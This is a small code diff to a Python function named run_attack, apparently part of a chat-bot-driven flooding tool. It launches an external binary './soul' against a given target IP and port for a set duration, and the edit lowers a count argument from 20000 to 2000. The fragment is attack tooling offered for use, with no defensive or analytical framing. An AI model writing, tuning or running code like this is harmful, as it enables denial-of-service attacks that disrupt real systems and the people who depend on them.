@@ -76,7 +76,7 @@ def run_attack(target_ip, target_port, duration, chat_id):
         os.sched_setaffinity(pid, range(8))  # Restrict to CPUs 0-7
 
         # Prepare the attack command
-        attack_command = ['./soul', target_ip, str(target_port), str(duration), '20000']
+        attack_command = ['./soul', target_ip, str(target_port), str(duration), '2000']
 
         # Start the attack
         process = subprocess.Popen(attack_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
